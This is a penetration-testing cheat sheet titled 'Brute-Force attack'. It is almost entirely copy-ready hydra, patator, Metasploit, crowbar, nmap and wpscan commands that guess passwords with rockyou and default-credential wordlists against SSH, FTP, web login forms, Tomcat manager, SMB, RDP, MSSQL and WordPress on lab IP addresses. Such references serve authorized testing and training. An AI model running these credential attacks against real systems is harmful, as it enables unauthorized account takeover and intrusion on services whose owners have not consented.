# Brute-Force attack



### SSH

{% code overflow="wrap" %}
```bash
patator ssh_login host=10.5.5.11 port=22 user=dev password=FILE0 0=/usr/share/wordlists/rockyou.txt persistent=0 -x ignore:mesg='Authentication failed.' -x quit:code=0
```
{% endcode %}

### FTP

{% code overflow="wrap" %}
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt -t 32 ftp://192.168.0.1

# Metasploit
msf
use auxiliary/scanner/ftp/ftp_login
msf auxiliary(ftp_login) > show options
msf auxiliary(ftp_login) > set PASS_FILE /usr/share/wordlist/rockyou.txt
msf auxiliary(ftp_login) > set USER_FILE ./users.txt
msf auxiliary(ftp_login) > set RHOSTS 10.11.1.8,13,14,22
msf auxiliary(ftp_login) > run
```
{% endcode %}

### HTTP/HTTPS GET

{% code overflow="wrap" %}
```bash
patator  http_fuzz  method=GET  follow=0  accept_cookie=0  --threads=1  timeout=10 url="http://192.168.1.44/?username=FILE1&password=FILE0&Login=Login" 
0=/usr/share/seclists/Usernames/top_shortlist.txt 1=/usr/share/seclists/Passwords/rockyou-40.txt header="Cookie: security=low; PHPSESSID=${SESSIONID}" -x quit:fgrep='Welcome to the password protected area'

patator http_fuzz method=GET follow=0 accept_cookie=0 timeout=10 url="http://192.168.142.214/admin.php?username=FILE0&password=FILE1" 0=ldap.txt 1=ldap.txt -x ignore:fgrep='Invalid login'

patator http_fuzz method=GET follow=0 accept_cookie=0 timeout=10 url="http://192.168.142.214/admin.php?username=FILE0&password=FILE1" 0=ldap.txt 1=ldap.txt -x ignore:fgrep='Invalid login'

```
{% endcode %}

### HTTP/HTTPS POST

{% code overflow="wrap" %}
```bash
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.1.1.1 \
http-post-form "/accounts/login/?next=/:csrfmiddlewaretoken=aFt9B4XORspniIgLhKTnAMawvt0MTz87&username=admin&password=^PASS^&next=%2Flicensing%2F:Sorry, that's not an active username or password" -V

hydra -L users.txt -P passwords2.txt 10.200.74.232 http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect' -v

patator http_fuzz method=POST follow=0 accept_cookie=0 --threads=1 timeout=10 url='http://192.168.128.10/login.php' 0=/opt/webapp/sql-login-bypass.md body='username=&password=FILE0' -x ignore:fgrep='Wrong username or password' -x ignore:fgrep='invalid query'
```
{% endcode %}

### HTTP BASIC AUTH (in case of tomcat platform )

{% code overflow="wrap" %}
```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html
```
{% endcode %}

### HTTP POST with cewl

{% code overflow="wrap" %}
```bash
# Create keyload list from the page

cewl http://10.1.1.1/otrs/installer.pl>>cewl
hydra -V -l root@localhost -P cewl 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-540&User=^USER^&Password=^PASS^:failed"
```
{% endcode %}

### SMB

{% code overflow="wrap" %}
```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt 192.168.1.12 smb -t 1
```
{% endcode %}

### RDP

{% code overflow="wrap" %}
```bash
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.1
crowbar -b rdp -s 10.1.1.1/32 -U users.txt -C /usr/share/wordlists/rockyou.txt -n 10
```
{% endcode %}

### MSSQL

{% code overflow="wrap" %}
```bash
cat /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d : -f 1 > user.txt
cat /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d : -f 2 > pass.txt
hydra -L ./user.txt –P ./pass.txt 10.1.1.1 mssql
nmap -p 1433 --script ms-sql-brute --script-args userdb=./user.txt,passdb=./pass.txt 10.1.1.1
```
{% endcode %}

### WordPress

{% code overflow="wrap" %}
```bash
wpscan --url http://192.168.142.145/wordpress --wordlist /root/wd/rockyou.txt --username admin --threads 50
```
{% endcode %}
